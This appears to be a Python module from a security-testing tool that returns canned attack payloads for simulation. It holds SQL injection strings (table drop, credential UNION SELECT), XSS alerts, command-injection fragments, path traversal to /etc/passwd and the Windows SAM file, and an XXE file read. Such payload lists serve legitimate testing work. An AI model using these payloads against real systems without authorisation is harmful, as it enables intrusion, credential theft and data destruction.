"""Payload generation for attack simulation."""
from typing import List, Dict
from enum import Enum

class AttackType(str, Enum):
    """Types of attacks to simulate."""
    SQL_INJECTION = "sql_injection"
    XSS = "xss"
    COMMAND_INJECTION = "command_injection"
    PATH_TRAVERSAL = "path_traversal"
    XXE = "xxe"

class PayloadGenerator:
    """Generate payloads for various attack vectors."""
    
    PAYLOADS: Dict[AttackType, List[str]] = {
        AttackType.SQL_INJECTION: [
            "' OR '1'='1",
            "'; DROP TABLE users; --",
            "1' UNION SELECT NULL, username, password FROM users -- ",
            "admin' --",
        ],
        AttackType.XSS: [
            "<script>alert('XSS')</script>",
            "javascript:alert('XSS')",
            "<img src=x onerror='alert(\"XSS\")'>",
            "<svg onload=alert('XSS')>",
        ],
        AttackType.COMMAND_INJECTION: [
            "; ls -la",
            "| whoami",
            "`id`",
            "$(whoami)",
        ],
        AttackType.PATH_TRAVERSAL: [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc/passwd",
        ],
        AttackType.XXE: [
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        ]
    }
    
    @classmethod
    def generate(cls, attack_type: AttackType, count: int = 3) -> List[str]:
        """Generate payloads for specified attack type."""
        payloads = cls.PAYLOADS.get(attack_type, [])
        return payloads[:count]
